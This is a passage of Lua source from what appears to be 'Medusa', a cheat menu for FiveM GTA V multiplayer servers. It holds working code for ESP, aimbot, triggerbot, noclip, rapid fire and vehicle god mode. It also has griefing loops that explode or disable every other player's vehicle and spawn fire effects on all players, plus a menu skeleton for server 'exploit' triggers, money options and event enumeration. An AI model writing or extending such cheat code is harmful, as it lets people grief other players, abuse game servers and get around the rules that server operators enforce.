									SetBlipSprite(blip, 423)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 14 then -- Boat
								if blipSprite ~= 427 then
									SetBlipSprite(blip, 427)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("limo2") then -- Turreted Limo
								if blipSprite ~= 460 then
									SetBlipSprite(blip, 460)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("rhino") then -- Tank
								if blipSprite ~= 421 then
									SetBlipSprite(blip, 421)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then -- Trash
								if blipSprite ~= 318 then
									SetBlipSprite(blip, 318)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("pbus") then -- Prison Bus
								if blipSprite ~= 513 then
									SetBlipSprite(blip, 513)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then -- Speedophiles
								if blipSprite ~= 471 then
									SetBlipSprite(blip, 471)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
								if blipSprite ~= 481 then
									SetBlipSprite(blip, 481)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("taxi") then -- Cab/ Taxi
								if blipSprite ~= 198 then
									SetBlipSprite(blip, 198)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
								or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
								or vehModel == GetHashKey("policeold2") then
								if blipSprite ~= 56 then
									SetBlipSprite(blip, 56)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
							end

							-- Show number in case of passangers
							local passengers = GetVehicleNumberOfPassengers(veh)

							if passengers > 0 then
								if not IsVehicleSeatFree(veh, -1) then
									passengers = passengers + 1
								end
								ShowNumberOnBlip(blip, passengers)
							else
								HideNumberOnBlip(blip)
							end
						else
							-- Remove leftover number
							HideNumberOnBlip(blip)

							if blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator

							end
						end

						SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
						SetBlipNameToPlayerName(blip, id) -- update blip name
						SetBlipScale(blip,  0.85) -- set scale

						-- set player alpha
						if IsPauseMenuActive() then
							SetBlipAlpha( blip, 255 )
						else
							x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
							x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
							distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
							-- Probably a way easier way to do this but whatever im an idiot

							if distance < 0 then
								distance = 0
							elseif distance > 255 then
								distance = 255
							end
							SetBlipAlpha(blip, distance)
						end
					end
				end
			end
		elseif not playerBlips then
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				local ped = GetPlayerPed(id)
				local blip = GetBlipFromEntity(ped)
				if DoesBlipExist(blip) then -- Removes blip
					RemoveBlip(blip)
				end
			end
		
		end

		SetWeaponDamageModifier(GetSelectedPedWeapon(PlayerPedId()), SliderOptions.DamageModifier.Values[SliderOptions.DamageModifier.Selected])

		if Medusa.Toggle.VehicleCollision then
            playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
            for k in EnumerateVehicles() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumerateObjects() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumeratePeds() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
        end

		
		if Medusa.Toggle.EasyHandling then
			if Medusa.Player.Vehicle ~= 0 then
				SetVehicleGravityAmount(Medusa.Player.Vehicle, 30.0)
			end
		else
			if Medusa.Player.Vehicle ~= 0 then
				SetVehicleGravityAmount(Medusa.Player.Vehicle, 9.8)
			end
		end

		if changingPos and menus then
				-- Math Linux Prou 
				local c_x, c_y = 0
				local x_c = 0
				local y_c = 0
				local w, h = GetActiveScreenResolution()
				c_x, c_y = GetNuiCursorPosition()
				x_c = (c_x / w)
				y_c = (c_y / h)
				-- Linux run out of math :(

				-- Disable camera movement
					DisableControlAction(0, 1, true)
					DisableControlAction(0, 2, true)
				-- END Disable Camera Movement


			for _key, _value in pairs(menus) do
				if x_c + menuWidth <= 1 then
					_value.x = x_c
				else
					_value.x = 1.0 - menuWidth
				end
				if Medusa.Data.YDownRef < 1.0 then
					_value.y = y_c - 0.04
				elseif (y_c - 0.04) < _value.y then
					_value.y = y_c - 0.04
				else
					_value.y = _value.y - (Medusa.Data.YDownRef - 1.0)
				end

				DrawPlayerInfo.y = _value.y + titleHeight
				DrawPlayerInfo.x = _value.x - frameWidth / 2 - frameWidth - previewWidth / 2 
			end
		end

		if showNametags then
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				if GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then
					local ped = GetPlayerPed( id )
					--blip = GetBlipFromEntity( ped )

					local x1, y1, z1 = table.unpack( GetEntityCoords(PlayerPedId(), true) )
					local x2, y2, z2 = table.unpack( GetEntityCoords(GetPlayerPed(id), true) )
					local distance = math.round(#(vector3(x1, y1, z1) - vector3(x2, y2, z2)), 1)

					if distance < 125 then
						if NetworkIsPlayerTalking(id) then
							DrawText3D(x2, y2, z2 + 1.25, "" .. GetPlayerServerId(id) .. " | " .. GetPlayerName(id) .. "", 30, 144, 255)
						else
							DrawText3D(x2, y2, z2 + 1.25, "" .. GetPlayerServerId(id) .. " | " .. GetPlayerName(id) .. "", 255, 255, 255)
						end
					end
				end
			end
		end

		if showGoodNametags then
			tags_plist = GetActivePlayers()
			for i = 1, #tags_plist do
				ptags[i] = CreateFakeMpGamerTag(GetPlayerPed(tags_plist[i]), GetPlayerName(tags_plist[i]), 0, 0, "", 0)
				SetMpGamerTagVisibility(ptags[i], 0, NametagsEnabled)
				SetMpGamerTagVisibility(ptags[i], 2, NametagsEnabled)
			end

            for i = 1, #tags_plist do
                if NetworkIsPlayerTalking(tags_plist[i]) then
                    SetMpGamerTagVisibility(ptags[i], 4, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 4, 0)
                end
                
                if IsPedInAnyVehicle(GetPlayerPed(tags_plist[i])) and GetSeatPedIsIn(GetPlayerPed(tags_plist[i])) == 0 then
                    SetMpGamerTagVisibility(ptags[i], 8, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 8, 0)
                end
            
            end
		elseif not showNametags then
			-- for i = 1, #ptags do
			-- 	SetMpGamerTagVisibility(ptags[i], 4, 0)
			-- 	SetMpGamerTagVisibility(ptags[i], 8, 0)
			-- end
		end
		

		if SuperJump then
			SetSuperJumpThisFrame(PlayerId())
		end

		if InfStamina then
			RestorePlayerStamina(PlayerId(), 1.0)
		end

		SetRunSprintMultiplierForPlayer(PlayerId(), SliderOptions.FastRun.Values[SliderOptions.FastRun.Selected])
		SetPedMoveRateOverride(PlayerPedId(), SliderOptions.FastRun.Values[SliderOptions.FastRun.Selected])

		if VehicleGun then
			local VehicleGunVehicle = "Freight"
			local playerPedPos = GetEntityCoords(PlayerPedId(), true)
			if (IsPedInAnyVehicle(PlayerPedId(), true) == false) then
				GiveWeaponToPed(PlayerPedId(), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
				SetPedAmmo(PlayerPedId(), GetHashKey("WEAPON_APPISTOL"), 999999)
				if (GetSelectedPedWeapon(PlayerPedId()) == GetHashKey("WEAPON_APPISTOL")) then
					if IsPedShooting(PlayerPedId()) then
						while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
							Citizen.Wait(0)
							RequestModel(GetHashKey(VehicleGunVehicle))
						end
						local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(PlayerPedId())), playerPedPos.y + (5 * GetEntityForwardY(PlayerPedId())), playerPedPos.z + 2.0, GetEntityHeading(PlayerPedId()), true, true)
						SetEntityAsNoLongerNeeded(veh)
						SetVehicleForwardSpeed(veh, 150.0)
					end
				end
			end
		end

		if Medusa.Toggle.DeleteGun then
			local found, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
			if found then
				local entityCoords = GetEntityCoords(entity)
				DrawMarker(2, entityCoords.x, entityCoords.y, entityCoords.z + 2, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 2.0, 2.0, 2.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 170, false, true, 2, nil, nil, false)
				if IsDisabledControlPressed(0, Medusa.Keys["MOUSE1"]) then
					SetEntityAsMissionEntity(entity)
					DeleteEntity(entity)
				end
			end
		end

		if Medusa.Toggle.RapidFire then
			DisablePlayerFiring(PlayerPedId(), true)
			if IsDisabledControlPressed(0, Medusa.Keys["MOUSE1"]) then
				local _, weapon = GetCurrentPedWeapon(PlayerPedId())
				local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
				local camDir = GetCamDirFromScreenCenter()
				local camPos = GetGameplayCamCoord()
				local launchPos = GetEntityCoords(wepent)
				local targetPos = camPos + (camDir * 200.0)
				
				ClearAreaOfProjectiles(launchPos, 0.0, 1)
				
				ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
				ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
			end
		end

		if destroyvehicles then
			for vehicle in EnumerateVehicles() do
				if (vehicle ~= GetVehiclePedIsIn(PlayerPedId(), false)) then
					NetworkRequestControlOfEntity(vehicle)
					SetVehicleUndriveable(vehicle,true)
					SetVehicleEngineHealth(vehicle, 100)
				end
			end
		end


		if explodevehicles then
			for vehicle in EnumerateVehicles() do
				if (vehicle ~= GetVehiclePedIsIn(PlayerPedId(), false)) then
					NetworkRequestControlOfEntity(vehicle)
					NetworkExplodeVehicle(vehicle, true, true, false)
				end
			end
		end
		
		dance = false
		if dance then
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				--Medusa.Functions.Print("Entidad: ".. tostring(IsEntityOnScreen(GetPlayerPed(id))), " ID: " .. tostring(id))
				if id ~= PlayerId() and GetPlayerServerId(id) ~= 0 then
					local _Ped = GetPlayerPed(id)
					Medusa.Game:RequestControlOnce(_Ped)
					TaskStartScenarioInPlace(GetPlayerPed(127), "world_human_muscle_free_weights", 0, true);
					TaskLookAtCoord(PlayerPedId(), GetEntityCoords(GetPlayerPed(127)), 5000, 1, 1)
				end
			end
		end
		if Medusa.Config.ESP.activated then
			Medusa.Functions.Print(Medusa.Config.ESP.activated)
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				--Medusa.Functions.Print("Entidad: ".. tostring(IsEntityOnScreen(GetPlayerPed(id))), " ID: " .. tostring(id))
				 if --[[id ~= PlayerId() and]] GetPlayerServerId(id) ~= 0 then
					local esplegit = true
					if esplegit then
						--local ra = {r = 255, g = 255, b = 255, a = 255}
						local pPed = GetPlayerPed(id)
						Medusa.Functions.Draw2DEspToPed(pPed)
						local _cx, _cy, _cz = table.unpack(GetEntityCoords(PlayerPedId()))
						local _x, _y, _z = table.unpack(GetEntityCoords(pPed))
						local raya, rayb, rayc, rayd, raye, rayf = GetShapeTestResult(StartShapeTestRay(cx, cy, cz, x, y, z, 2, -1, 1))
						local message = 
							"Name: \t\t" .. GetPlayerName(id) ..
							"\nServer ID: \t" .. GetPlayerServerId(id) ..
							"\nPlayer ID: \t" .. id .. 
							"\nDistance: \t" .. math.round(#(vector3(_cx, _cy, _cz) - vector3( _x, _y, _z)), 1)
						if IsPedInAnyVehicle(pPed, true) then
							local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
							message = message .. string.format("\nVehicle: \t" .. VehName)
						end
						if Medusa.Config.ESP.box.activate then
							if Medusa.Config.ESP.box.npc then
								-- Medusa.Functions.GetAllPeds(0, function(pPed)
								-- 	Medusa.Functions.Draw2DEspToPed(pPed)
								-- end)
							else
								--Medusa.Functions.Draw2DEspToPed(pPed)
							end
						end
						if Medusa.Config.ESP.lines.activate then
							--if Medusa.Config.ESP.box.npc then
							local ra = {r = 255, g = 255, b = 255, a = 255}
								-- Medusa.Functions.GetAllPeds(0, function(pPed)
								-- 	local x, y, z = table.unpack(GetEntityCoords(pPed))
								-- 	local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
								-- end)

								--[[LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
								LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
								LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
								LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
								LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
								LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
								LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

								TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
								TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
								TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
								TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
								TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
								TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
								TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

								ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
								ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
								ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
								ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
								ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
								ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
								ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
								ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)

								DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
								--Medusa.Functions.Print(raya, rayb, rayc, rayd, raye,  rayf)
								DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)]]

						end
					end
				end
			end
		end

		if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
			SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
		end

		if VehSpeed and IsPedInAnyVehicle(PlayerPedId(), true) then
			if IsControlPressed(0, 209) then
				SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
			elseif IsControlPressed(0, 210) then
				SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
			end
		end

		if TriggerBot then
				local plist = GetActivePlayers()
				for i = 1, #plist do
					local id = plist[i]
					local player = id
					if player ~= PlayerId() and not Medusa.Data.FriendList[GetPlayerServerId(player)] then
						local Entity = GetPlayerPed(player)
						local TargetPos = GetEntityCoords(Entity)
						local Exist = DoesEntityExist(Entity)
						local Visible = IsEntityVisible(Entity)
						local Dead = IsPlayerDead(Entity)
						local TargetCoords = GetPedBoneCoords(Entity, 31086, 0, 0, 0)
						local BoneCoordsx, BoneCoordsy, BoneCoordsz = table.unpack(TargetCoords)

						local isAiming, targetEntity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
						if isAiming and Entity == targetEntity then
							if IsPedAPlayer(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
								SetPedShootsAtCoord(PlayerPedId(), BoneCoordsx, BoneCoordsy, BoneCoordsz, true)		
								
								if GetEntityHealth(Entity) > 0 then
									DrawMarker(28, TargetCoords.x, TargetCoords.y, TargetCoords.z + 0.05, 0.0, 0.0, 0.0, 0, 0.0, 0.0, 0.18, 0.18, 0.2, 46, 204, 113, 205, false, true, 2, false, false, false, false)
								else
									DrawMarker(28, TargetCoords.x, TargetCoords.y, TargetCoords.z + 0.05, 0.0, 0.0, 0.0, 0, 0.0, 0.0, 0.25, 0.25, 0.25, 231, 76, 60, 205, false, true, 2, false, false, false, false)
								end
							end
						end
					end
				end
	
		end

		if Drift then
			Medusa.Functions.Drift()
		end

		if AimBot then
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				local player = id
				if player ~= PlayerId() then
					if IsPlayerFreeAiming(PlayerId()) then
						local TargetPed = GetPlayerPed(player)
						local TargetPos = GetEntityCoords(TargetPed)
						local Exist = DoesEntityExist(TargetPed)
						local Visible = IsEntityVisible(TargetPed)
						local Dead = IsPlayerDead(TargetPed)
						local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)


						if GetEntityHealth(TargetPed) <= 0 then
							Dead = true
						end
						if not Medusa.Data.FriendList[GetPlayerServerId(player)] then
							if Exist and not Dead then
								if Visible then
									local OnScreenP, ScreenXP, ScreenYP = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
									if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 17) and OnScreenP then
										if IsControlPressed(0, 24) then
											Medusa.Functions.KillBulletPlayer(TargetCoords)
										end
									end
								end
							end
							if GetEntityHealth(TargetPed) > 0 then
								DrawMarker(28, TargetCoords.x, TargetCoords.y, TargetCoords.z + 0.05, 0.0, 0.0, 0.0, 0, 0.0, 0.0, 0.18, 0.18, 0.2, 46, 204, 113, 205, false, true, 2, false, false, false, false)
							else
								DrawMarker(28, TargetCoords.x, TargetCoords.y, TargetCoords.z + 0.05, 0.0, 0.0, 0.0, 0, 0.0, 0.0, 0.25, 0.25, 0.25, 231, 76, 60, 205, false, true, 2, false, false, false, false)
							end
						end
					end
				end
			end
		end

		if Medusa.Options.BulletImpacts then

			local coords = GetEntityCoords(PlayerPedId())
			local bool, coords2 = GetPedLastWeaponImpactCoord(PlayerPedId())
			if bool then
				table.insert(Medusa.Data.Impacts, { ["x"] = coords.x, ["y"] = coords.y, ["z"] = coords.z, ["x2"] = coords2.x, ["y2"] = coords2.y, ["z2"] = coords2.z, ["delay"] = 5000, ["startTime"] = GetGameTimer()})
			end

			if #Medusa.Data.Impacts > 0 then
				for i = 1, #Medusa.Data.Impacts do
					local current = Medusa.Data.Impacts[i]
					if current then
						local distance = GetDistanceBetweenCoords(current["x"], current["y"], current["z"], current["x2"], current["y2"], current["z2"], true)
						local timer = (GetGameTimer() - current['startTime']) / current['delay'] * 50
						if distance >= 0 and distance < 25 then
							DrawLine(current["x"], current["y"], current["z"], current["x2"], current["y2"], current["z2"], 0, 0, 255, 255)
						elseif distance >= 25 and distance < 150 then
							DrawLine(current["x"], current["y"], current["z"], current["x2"], current["y2"], current["z2"], 0, 255, 0, 255)
						elseif distance >= 150 then
							DrawLine(current["x"], current["y"], current["z"], current["x2"], current["y2"], current["z2"], 255, 0, 0, 255)
						end
						
						
						if timer >= 50 then
							table.remove(Medusa.Data.Impacts, i)
						end
					end
				end
			end
		end

		if Medusa.Player.isNoclipping then
			local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
			local k = nil
			local x, y, z = nil
			
			if not isInVehicle then
				k = PlayerPedId()
				x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
			else
				k = GetVehiclePedIsIn(PlayerPedId(), 0)
				x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
			end
			
			if isInVehicle and Medusa.Game:GetSeatPedIsIn(PlayerPedId()) ~= -1 then Medusa.Game:RequestControlOnce(k) end
			
			local dx, dy, dz = Medusa.Game:GetCamDirection()
			SetEntityVisible(PlayerPedId(), 0, 0)
			SetEntityVisible(k, 0, 0)
			
			SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)
			
			if IsDisabledControlJustPressed(0, Medusa.Keys["LEFTSHIFT"]) then -- Change speed
				oldSpeed = NoclipSpeed
				NoclipSpeed = NoclipSpeed * 5
			end
			
			if IsDisabledControlJustReleased(0, Medusa.Keys["LEFTSHIFT"]) then -- Restore speed
				NoclipSpeed = oldSpeed
			end
			
			if IsDisabledControlPressed(0, 32) then -- MOVE FORWARD
				x = x + NoclipSpeed * dx
				y = y + NoclipSpeed * dy
				z = z + NoclipSpeed * dz
			end
			
			if IsDisabledControlPressed(0, 269) then -- MOVE BACK
				x = x - NoclipSpeed * dx
				y = y - NoclipSpeed * dy
				z = z - NoclipSpeed * dz
			end
			
			if IsDisabledControlPressed(0, Medusa.Keys["SPACE"]) then -- MOVE UP
				z = z + NoclipSpeed
			end
			
			if IsDisabledControlPressed(0, Medusa.Keys["LEFTCTRL"]) then -- MOVE DOWN
				z = z - NoclipSpeed
			end
			
			
			SetEntityCoordsNoOffset(k, x, y, z, true, true, true)
		end
		
		Citizen.Wait(0)
	end
end

Citizen.CreateThread(function()
	while true do
		local s = 250

		if Medusa.Options.ParticleTrollAll then
			for _, player in ipairs(GetActivePlayers()) do
				local ped = GetPlayerPed(player)
				local coords = GetEntityCoords(ped)
				GetActuallyParticul('core')
				SetPtfxAssetNextCall('core')
				StartParticleFxNonLoopedAtCoord_2('ent_sht_flame', coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 15.0, false, false, false)
				Wait(500)
				GetActuallyParticul('scr_rcbarry2')
				SetPtfxAssetNextCall('scr_rcbarry2')
				StartParticleFxNonLoopedAtCoord_2('scr_exp_clown', coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 50.0, false, false, false)
			end
		end

		Citizen.Wait(s)
	end
end)

CreateThread(MenuToggleThread)


-- Menu runtime for drawing and handling input
local function MenuRuntimeThread()
	FreezeEntityPosition(entity, false)
	local currentItemIndex = 1
	local selectedItemIndex = 1


	Medusa.CreateMenu("MedusaMainMenu", "Medusa")
	Medusa.SetTitleBackgroundSprite("MedusaMainMenu", 'shopui_title_graphics_franklin', 'shopui_title_graphics_franklin')
	Medusa.SetSubTitle("MedusaMainMenu", "Main Menu")

	-- MAIN MENU SELECT
	Medusa.CreateSubMenu("Self", "MedusaMainMenu", "Self Options")
	Medusa.CreateSubMenu("Others", "MedusaMainMenu", "Others Options")
	Medusa.CreateSubMenu('Misc', 'MedusaMainMenu', "Misc Options")
	Medusa.CreateSubMenu('Triggers', 'MedusaMainMenu', "Triggers")

	-- DYNAMIC TRIGGERS CATEGORIE
	Medusa.CreateSubMenu("ServerResources", "Triggers", "Resources")
	Medusa.CreateSubMenu("TriggersExploits", "Triggers", "Resources")
	Medusa.CreateSubMenu('ResourceData', "ServerResources", "Resource Data")
	Medusa.CreateSubMenu('ResourceCEvents', 'ResourceData', 'Event Handlers')
	Medusa.CreateSubMenu('ResourceSEvents', 'ResourceData', 'Server Events')
	Medusa.CreateSubMenu("ESXBoss", "ServerMenu", "ESX Boss Menus")
	Medusa.CreateSubMenu("ServerMoneyOptions", "ServerMenu", "Money Options")
	Medusa.CreateSubMenu("ESXMisc", "ServerMenu", "ESX Misc Options")
	Medusa.CreateSubMenu("ESXDrugs", "ServerMenu", "ESX Drugs")
	Medusa.CreateSubMenu("MiscServerOptions", "ServerMenu", "Misc Server Options")
	Medusa.CreateSubMenu("VRPOptions", "ServerMenu", "VRP Server Options")


	-- MAIN MENU CATEGORIES
	Medusa.CreateSubMenu("SelfMenu", "MedusaMainMenu", "Self Options")
	Medusa.CreateSubMenu("SelfSuperPowers", "SelfMenu", "Super Powers")
	Medusa.CreateSubMenu('OnlinePlayersMenu', 'Others', "Online Options")
	Medusa.CreateSubMenu("VisualMenu", "Others", "Visual Options")
	Medusa.CreateSubMenu("GlobalMenu", "Others", "Global Options")
	Medusa.CreateSubMenu("ESP Options", "VisualMenu", "ESPOptions")
	Medusa.CreateSubMenu("TeleportMenu", "Others", "Teleport Options")
	Medusa.CreateSubMenu("AimbotOptions",  'Others', "Aimbot Options")
	
	Medusa.CreateSubMenu("FunMenu", "Fun", "Fun Options")

    -- MAIN MENU > GLOBAL MENU > PROP MENU 
    Medusa.CreateSubMenu("GlobalProps",  'GlobalMenu', "Prop All")
    Medusa.CreateSubMenu("CustomProps",  'GlobalProps', "Prop Custom All")
    

	-- MAIN MENU > Vehicle Options
	Medusa.CreateSubMenu("LocalVehicleMenu", "MedusaMainMenu", "Vehicle Options")
	-- MAIN MENU > Vehicle Options > Vehicle Spawner
	Medusa.CreateSubMenu("LocalVehicleSpawner", "LocalVehicleMenu", "Vehicle Spawner")
	-- MAIN MENU > Vehicle Options > Vehicle Spawner > $class
	Medusa.CreateSubMenu("localcompacts", "LocalVehicleSpawner", "Compacts")
	Medusa.CreateSubMenu("localsedans", "LocalVehicleSpawner", "Sedans")
	Medusa.CreateSubMenu("localsuvs", "LocalVehicleSpawner", "SUVs")
	Medusa.CreateSubMenu("localcoupes", "LocalVehicleSpawner", "Coupes")
	Medusa.CreateSubMenu("localmuscle", "LocalVehicleSpawner", "Muscle")
	Medusa.CreateSubMenu("localsportsclassics", "LocalVehicleSpawner", "Sports Classics")
	Medusa.CreateSubMenu("localsports", "LocalVehicleSpawner", "Sports")
	Medusa.CreateSubMenu("localsuper", "LocalVehicleSpawner", "Super")
	Medusa.CreateSubMenu("localmotorcycles", "LocalVehicleSpawner", "Motorcycles")
	Medusa.CreateSubMenu("localoffroad", "LocalVehicleSpawner", "Off-Road")
	Medusa.CreateSubMenu("localindustrial", "LocalVehicleSpawner", "Industrial")
	Medusa.CreateSubMenu("localutility", "LocalVehicleSpawner", "Utility")
	Medusa.CreateSubMenu("localvans", "LocalVehicleSpawner", "Vans")
	Medusa.CreateSubMenu("localcycles", "LocalVehicleSpawner", "Cycles")
	Medusa.CreateSubMenu("localboats", "LocalVehicleSpawner", "Boats")
	Medusa.CreateSubMenu("localhelicopters", "LocalVehicleSpawner", "Helicopters")
	Medusa.CreateSubMenu("localplanes", "LocalVehicleSpawner", "Planes")
	Medusa.CreateSubMenu("localservice", "LocalVehicleSpawner", "Service")
	Medusa.CreateSubMenu("localcommercial", "LocalVehicleSpawner", "Commercial")
	
	Medusa.CreateSubMenu("LocalWepMenu", "MedusaMainMenu", "Weapon Options")
	Medusa.CreateSubMenu("ServerMenu", "MedusaMainMenu", "Server Options")
	Medusa.CreateSubMenu("GriefMenu", "MedusaMainMenu", "Griefer Options")
	Medusa.CreateSubMenu("MenuSettings", "Misc", "Menu Settings")
	
	Medusa.CreateSubMenu('LSC', 'LocalVehicleMenu', "Los Santos Customs")
	Medusa.CreateSubMenu('lsc_bodywork', 'LSC', 'Bodywork')
	Medusa.CreateSubMenu('lsc_performance', 'LSC', 'Performance Tuning')

	-- ONLINE PLAYERS MENU
	Medusa.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayersMenu', "Player Options")
	
	-- ONLINE PLAYERS > PLAYER > WEAPON OPTIONS MENU
	Medusa.CreateSubMenu('OnlineWepMenu', 'PlayerOptionsMenu', 'Weapon Menu')
	Medusa.CreateSubMenu('OnlineWepCategory', 'OnlineWepMenu', 'Give Weapon')
	Medusa.CreateSubMenu("OnlineMeleeWeapons", "OnlineWepCategory", "Melee")
	Medusa.CreateSubMenu("OnlineSidearmWeapons", "OnlineWepCategory", "Handguns")
	Medusa.CreateSubMenu("OnlineAutorifleWeapons", "OnlineWepCategory", "Assault Rifles")
	Medusa.CreateSubMenu("OnlineShotgunWeapons", "OnlineWepCategory", "Shotguns")

	-- ONLINE PLAYERS > PLAYER > TROLL 
